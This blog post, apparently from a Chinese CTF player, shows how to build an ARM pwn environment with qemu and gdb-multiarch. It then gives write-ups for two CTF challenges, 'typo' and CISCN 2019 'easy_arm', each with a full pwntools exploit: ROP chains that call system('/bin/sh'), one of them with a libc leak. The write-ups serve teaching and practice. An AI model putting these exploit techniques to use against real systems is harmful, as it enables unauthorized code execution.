<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>Arm-pwn 环境搭建及示例 | Room of Requirement | pwn what you want</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,stack">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Sirius Whiter</h5>
          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
            
              <span>x</span>
            
              <span>u</span>
            
              <span>e</span>
            
              <span>w</span>
            
              <span>e</span>
            
              <span>n</span>
            
              <span>j</span>
            
              <span>i</span>
            
              <span>e</span>
            
              <span>2</span>
            
              <span>0</span>
            
              <span>1</span>
            
              <span>7</span>
            
              <span>@</span>
            
              <span>o</span>
            
              <span>u</span>
            
              <span>t</span>
            
              <span>l</span>
            
              <span>o</span>
            
              <span>o</span>
            
              <span>k</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/siriuswhiter" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/siriuswhiter" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        
	
<header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>Arm-pwn 环境搭建及示例</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">Arm-pwn 环境搭建及示例</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-07-13T02:36:41.000Z" itemprop="datePublished" class="page-time">
  2019-07-13
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>




<div class="container body-wrap">
    <article id="post-arm-pwn-环境搭建及示例"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">Arm-pwn 环境搭建及示例</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-07-13 10:36:41" datetime="2019-07-13T02:36:41.000Z"  itemprop="datePublished">2019-07-13</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p><em>为了搭建这个环境费了好多心思，也花了好久好久~~~，网上的教程大多都是arm的板子的调试，最后终于找到了简单合适的办法</em></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在已经有了gdb ，pwntools等之前pwn需要的环境下来进行下面的搭建</p>
<ol>
<li><p>安装gdb-multiarch</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装qemu，这个倒是不论在什么教程里都一定会有的，模拟跨平台神器，这里貌似只要安装qemu-user就可以了<br>binfmt*是用来识别文件类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-user-binfmt</span><br><span class="line">sudo apt-get install &quot;binfmt*&quot;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>只用这两步就可以直接运行静态链接的arm程序，尝试打开jarvisoj的typo，正常运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/arm-test$ file typo</span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line">sirius@ubuntu:~/tikool/arm-test$ ./typo </span><br><span class="line">Let&apos;s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ if you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">sour</span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>下一步是为了能够运行动态链接的跨平台如arm的程序的</li>
</ol>
<p>查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search  &quot;libc6-&quot; | grep &apos;arm&apos;</span><br></pre></td></tr></table></figure></p>
<p>或利用tab补全来查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-*</span><br></pre></td></tr></table></figure></p>
<p>在其中寻找所需的架构对应的库，比如arm32用的是这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-armel-cross</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>运行方式，-L 指定运行库，-g 指定端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabi  ./ciscn_2019_en_1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><em>arm（大端）和armel（小端）区别在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。其他如mips同理</em></p>
<p>这里使用信安大赛华北赛区的一道arm题来测试，不加参数-g可以直接运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/arm-test$ file ciscn_2019_en_1 </span><br><span class="line">ciscn_2019_en_1: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1aaea66452d1dc8a477419b71a3ebaaad001ada1, stripped</span><br><span class="line">sirius@ubuntu:~/tikool/arm-test$ qemu-arm -L /usr/arm-linux-gnueabi  ./ciscn_2019_en_1 </span><br><span class="line">your name:</span><br><span class="line"></span><br><span class="line">aaaaaaaa</span><br><span class="line">hello aaaaaaaa</span><br></pre></td></tr></table></figure></p>
<ol start="5">
<li>调试，之前一直就是调试这里搭不好，这里不需要用gdbserver。。</li>
</ol>
<p>首先让程序按上面的步骤在一个端口比如说1234跑起来，然后在另一边使用gdb-multiarch进行调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  pwnname</span><br></pre></td></tr></table></figure></p>
<p>进入gdb后 set architecture 设置架构（据说一般都会自动识别成功，不用设置），然后target remote ip:port 远程连接</p>
<p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br></pre></td></tr></table></figure></p>
<ol start="6">
<li>脚本调试</li>
</ol>
<p>使用socat在本地运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10002,fork exec:&quot;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi  ./pwn&quot;;reuseaddr</span><br></pre></td></tr></table></figure></p>
<p>脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remote 127.0.0.1:10002</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure></p>
<p>这里将pause相当于断点，pause之后再开窗口打开gdb-multiarch进行调试，这样还是有点麻烦，但是现在不知道有什么好办法。</p>
<h1 id="关于ARM"><a href="#关于ARM" class="headerlink" title="关于ARM"></a>关于ARM</h1><p>参考：<a href="https://www.jianshu.com/p/bd96a8f58cbd" target="_blank" rel="noopener">https://www.jianshu.com/p/bd96a8f58cbd</a></p>
<figure class="image-box">
                <a rel=Arm-pwn 环境搭建及示例 href="/2019/07/13/arm-pwn-环境搭建及示例/ARM_Calling_Convention.png" class="swipebox" title=undefined><img src="/2019/07/13/arm-pwn-环境搭建及示例/ARM_Calling_Convention.png" alt="arm''" title="" class=""></a>
                <p>arm''</p>
            </figure>
<p>r0 - r3 存放参数 1-4 ，其余参数从右到左入栈； </p>
<p>被调用者实现栈平衡； </p>
<p>返回值存放在r0</p>
<p>R13 相当于栈指针ESP/RSP</p>
<p>PC 相当于EIP/RIP指针<br>LR link register 保存返回地址的寄存器</p>
<p>BL 相当于call ， 跳转并把返回值保存到LR中<br>B 相当于jmp<br>BX 跳转并切换状态 ARM 与THUMB 指令<br>BLX  带返回的跳转并切换状态</p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>静态链接，简单的ROP，但是arm的看起来没那么熟悉；开启栈不可执行保护，其他没开</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先找下gadget，因为被strip了，没有了符号表，所以system无法直接找到<br>说是用rizzo可以恢复部分符号<br>因为要传一个参数，所以可以找下r0</p>
<ul>
<li>关于导入符号表</li>
</ul>
<p>先把导入的libc文件拿出来,使用rizzo导出为.riz文件</p>
<figure class="image-box">
                <a rel=Arm-pwn 环境搭建及示例 href="/2019/07/13/arm-pwn-环境搭建及示例/export.png" class="swipebox" title=undefined><img src="/2019/07/13/arm-pwn-环境搭建及示例/export.png" alt="导出" title="" class=""></a>
                <p>导出</p>
            </figure>
<p>再把riz导入文件</p>
<figure class="image-box">
                <a rel=Arm-pwn 环境搭建及示例 href="/2019/07/13/arm-pwn-环境搭建及示例/import.png" class="swipebox" title=undefined><img src="/2019/07/13/arm-pwn-环境搭建及示例/import.png" alt="导入" title="" class=""></a>
                <p>导入</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary typo --only &apos;pop&apos; | grep r0</span><br><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br></pre></td></tr></table></figure>
<p>里面刚好还要pc，前面已经指定pc是相当于eip指针，所以这里可以顺便把system pop到 pc</p>
<p>关于偏移，理论上是可以用pwntools的cyclic，但是在arm程序里运行的不太对，不知道哪里出错了，只能爆破一下得到偏移</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &apos;typo&apos;</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">	local = 0</span><br><span class="line">else:</span><br><span class="line">	local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">	sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;typo&apos;])</span><br><span class="line">	elf = ELF(&apos;./typo&apos;)</span><br><span class="line">else:</span><br><span class="line">	sh = remote(&apos;127.0.01&apos;,&apos;10002&apos;)</span><br><span class="line">	elf = ELF(&apos;./typo&apos;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">pop_r0_r4_pc = 0x00020904</span><br><span class="line">system = 0x110b4</span><br><span class="line">binsh = 0x6c384</span><br><span class="line">pay = &apos;a&apos;*112+p32(pop_r0_r4_pc)+p32(binsh)*2+p32(system)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&quot;&quot;)</span><br><span class="line">#pause()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easy-arm"><a href="#easy-arm" class="headerlink" title="easy_arm"></a>easy_arm</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>半决赛的题。。因为是arm的大部分就没做出来。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">signed int vul()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-24h]</span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  puts(&quot;your name:\n&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  printf(&quot;hello %s\n&quot;, &amp;buf);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>寻找可用的gadget，为了后面能够进行参数传递势必要能够控制r0</p>
<p>直接用ROPgadget only pop时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary &apos;ciscn_2019_en_1&apos;  --only &apos;pop&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000103a4 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000104f8 : pop &#123;r4, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 2</span><br></pre></td></tr></table></figure></p>
<p>这里只能够直接控制r3 和返回地址pc ，所以还需要找点其他的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010638 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; ; andeq r0, r1, r8, lsl sb ; andeq r0, r1, r0, lsl sb ; bx lr</span><br></pre></td></tr></table></figure>
<p>这边发现能控制很多寄存器，但是没有r0；单独寻找r0相关，找到了这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010628 : mov r0, r7 ; blx r3</span><br></pre></td></tr></table></figure></p>
<p>因为上一步能够控制r7，也就相当于可以控制这里的r0。构造rop链，第一次进行泄露libc地址，第二次getshell</p>
<p>中间发现使用上面的构造链会泄露完地址就fault退出，不过也发现了基址是不变的，可以泄露完再打一次getshell</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &apos;ciscn_2019_en_1&apos;</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">	local = 0</span><br><span class="line">else:</span><br><span class="line">	local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">	sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])</span><br><span class="line">	elf = ELF(&apos;./ciscn_2019_en_1&apos;)</span><br><span class="line">	libc = ELF(&apos;/usr/arm-linux-gnueabi/lib/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">	sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">	elf = ELF(&apos;./ciscn_2019_en_1&apos;)</span><br><span class="line"></span><br><span class="line">mov_r07_br3 = 0x10628</span><br><span class="line">pop_r3_pc = 0x103a4</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">pop_r45678sbslpc = 0x10638</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)</span><br><span class="line">pay += p32(0)*3+p32(puts_got) #r7</span><br><span class="line">pay += p32(0)*3+p32(pop_r3_pc) #pc</span><br><span class="line">pay += p32(puts_plt) #r3</span><br><span class="line">pay += p32(mov_r07_br3) #pc</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">puts_addr = u32(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(4,&apos;\x00&apos;))</span><br><span class="line">libc.base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">print hex(libc.base)</span><br><span class="line">system_addr = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)</span><br><span class="line">pay += p32(0)*3+p32(binsh_addr)</span><br><span class="line">pay += p32(0)*3+p32(pop_r3_pc)</span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += p32(mov_r07_br3)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="之前的尝试笔记"><a href="#之前的尝试笔记" class="headerlink" title="之前的尝试笔记"></a>之前的尝试笔记</h1><p>之前做到的比较好的地方在于动态链接程序也能直接跑而不用指定库，应该是建立的软连接和导入库路径的设置</p>
<h2 id="arm-程序运行"><a href="#arm-程序运行" class="headerlink" title="arm 程序运行"></a>arm 程序运行</h2><ol>
<li><p>安装必要的程序 qemu  gcc for arm 交叉编译 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu gcc-5-arm-linux-gnueabihf gcc-5-multilib-arm-linux-gnueabihf</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行arm文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm ./filename</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>提示找不到库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/ld-linux-armhf.so.3: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>查找并建立软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name ld-linux-armhf.so.3</span><br><span class="line"></span><br><span class="line">sudo ln -s /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux-armhf.so.3</span><br></pre></td></tr></table></figure></p>
<p>再运行找不到libc.so.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure></p>
<p>方便起见写入自启动脚本（一般还是不要写的好。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH&quot; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></p>
<h2 id="arm-gdb"><a href="#arm-gdb" class="headerlink" title="arm-gdb"></a>arm-gdb</h2><p>gdb源码下载：<a href="http://www.gnu.org/software/gdb/download/" target="_blank" rel="noopener">http://www.gnu.org/software/gdb/download/</a></p>
<p>gdb 版本不要太高，这里选择和本机一个版本的gdb</p>
<p>解压：tar xvf gdb-7.11.1.tar.xz</p>
<p>安装可能需要的库</p>
<p>sudo apt-get install  texinfo libncurses5-dev m4 flex bison</p>
<ul>
<li>编译arm-linux-gdb  &amp; gdbserver</li>
</ul>
<p>进入源码目录： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=arm-linux --prefix=/home/sirius/tools/gdb/arm-gdb</span><br><span class="line">make -j8</span><br><span class="line">sudo make install -j8</span><br></pre></td></tr></table></figure>
<p>这里可能会报错说__NR_rt_sigreturn未定义<br>加个头文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ifndef  __NR_sigreturn</span><br><span class="line">#include &lt;asm/unistd.h&gt;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p>
<p>arm-gdb/bin 下可以看到 arm-linux-gdb arm-linux-run</p>
<p>将其加入环境变量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/profile</span><br><span class="line">export PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin</span><br></pre></td></tr></table></figure>
<ul>
<li>编译gdb client</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd gdb/gdbserver</span><br><span class="line">export PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin</span><br><span class="line">./configure --target=arm-linux --host=arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">vi config.h</span><br><span class="line">#define HAVA_SYS_REG_H  将此句注释</span><br><span class="line"></span><br><span class="line">make CC=arm-linux-gnueabi-gcc  -j8</span><br></pre></td></tr></table></figure>
<p>这里可能会报错说没有arm-linux-gnueabi-gcc， 使用apt安装就可以了</p>
<ul>
<li>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver :1234 ./pwn</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这里调试的时候便会出错</p>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2019-07-14T01:46:36.268Z" itemprop="dateUpdated">2019-07-14 09:46:36</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2019/07/13/arm-pwn-环境搭建及示例/" target="_blank" rel="external">http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/</a>
        
    </div>
    <footer>
        <a href="http://siriuswhiter.tk">
            <img src="/img/avatar.jpg" alt="Sirius Whiter">
            Sirius Whiter
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/&title=《Arm-pwn 环境搭建及示例》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/&title=《Arm-pwn 环境搭建及示例》 — Room of Requirement&source=菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
